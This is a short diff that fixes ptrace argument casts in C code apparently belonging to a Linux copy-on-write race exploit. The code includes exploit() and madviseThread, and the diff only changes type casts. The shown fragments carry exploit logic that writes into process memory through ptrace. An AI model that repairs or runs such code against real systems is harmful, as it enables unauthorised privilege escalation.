@@ -114,7 +114,7 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
 	while (n >= sizeof(long)) {
 		if (*((long *) s) != *((long *) d)) {
 			memcpy(&value, s, sizeof(value));
-			if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
+			if (ptrace(PTRACE_POKETEXT, pid, d, (void*)value) == -1) {
 				warn("ptrace(PTRACE_POKETEXT)");
 				return -1;
 			}
@@ -136,7 +136,7 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
 		}
 
 		memcpy((unsigned char *)&value + sizeof(value) - n, s, n);
-		if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
+		if (ptrace(PTRACE_POKETEXT, pid, d, (void*)value) == -1) {
 			warn("ptrace(PTRACE_POKETEXT)");
 			return -1;
 		}
@@ -224,7 +224,7 @@ static void exploit(struct mem_arg *mem_arg)
 			pthread_join(pth3, NULL);
 		} else {
 			pthread_create(&pth1, NULL, madviseThread, mem_arg);
-			ptrace(PTRACE_TRACEME, NULL, NULL, NULL);
+			ptrace(PTRACE_TRACEME, 0, NULL, NULL);
 			kill(getpid(),SIGSTOP);
 			// we're done, tell madviseThread to stop and wait for it
 			mem_arg->stop = 1;
